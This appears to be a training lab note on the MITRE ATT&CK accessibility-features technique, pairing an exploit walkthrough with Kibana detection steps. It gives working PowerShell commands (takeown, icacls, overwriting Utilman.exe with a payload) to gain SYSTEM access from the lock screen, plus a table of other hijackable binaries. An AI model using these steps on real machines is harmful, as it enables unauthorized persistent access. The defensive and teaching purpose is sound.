# [Accessibility Features](https://attack.mitre.org/techniques/T1546/008/)

## **Exploit syntax:**

1. Get a beacon with `system` privileges. 

2. Put a payload on the victim box if it's not already present.

3. In parrot open a blank text file and paste the following commands into it and choose either to move or copy the payload on the third line then set the `<payload path>` to the payload location on the victim box
   
    ```powershell
    takeown /f c:\windows\system32\Utilman.exe /A;
	icacls c:\windows\system32\Utilman.exe /grant administrators:F;
	<move/copy> <payload path> c:\windows\system32\Utilman.exe;
    ```
4. Save the file with as` NoobNoob.ps1` to `/tmp` on parrot-vm
5. Run
	```sh
	sudo chmod +x /tmp/NoobNoob.ps1
	```

6.  In posh, run
    ```pwoershell
	pslo /tmp/NoobNoob.ps1
    ```
7. From the login lockscreen of the windows box, press the windows key and 'U'
and the payload will execute. No login is required. Should give you System privileges.   

  
### **Affected Programs**
| Description        | Executable        | Keyboard Shortcut         |
|--------------------|-------------------|---------------------------|
| Sticky Keys        | sethc.exe         | Shift 5 times             |
| On-Screen Keyboard | osk.exe           | Windows + Control + U     |
| Utility Manager    | utilman.exe       | Windows + U               |
| Display Switcher   | DisplaySwitch.exe | Windows + P               |
| App Switcher       | AtBroker.exe      | Alt + Tab                 |
| Magnifier          | Magnify.exe       | Windows + +               |
| Narrator           | Narrator.exe      | Windows + Control + Enter |


---

## **Detection Technique:**

* Observe common Windows Accessibility Features executables
	* sethc.exe 
	* Utilman.exe
	* osk.exe
	* Narrator.exe
	* Magnify.exe
* Within Kibana ( Using winlogbeat-* indices ):
	* Identify process creations by filtering `event.code: 1`
	* Add relevant fields to columns for search ease.
	* Correlate the `process.name` / `process.id` fields with the `process.parent.name` / `process.parent.id` fields.
	* Look at the `process.command_line` to see what the process actions were, if any.

---

## **Resources**

* https://dmfrsecurity.com/2021/09/10/accessibility-features-persistence/ 
* https://www.ired.team/offensive-security/persistence/t1015-sethc

### **Execution and Detection method explained**
* https://en.it-pirate.eu/windows-defender-atp-sticky-keys-binary-hijack-detected/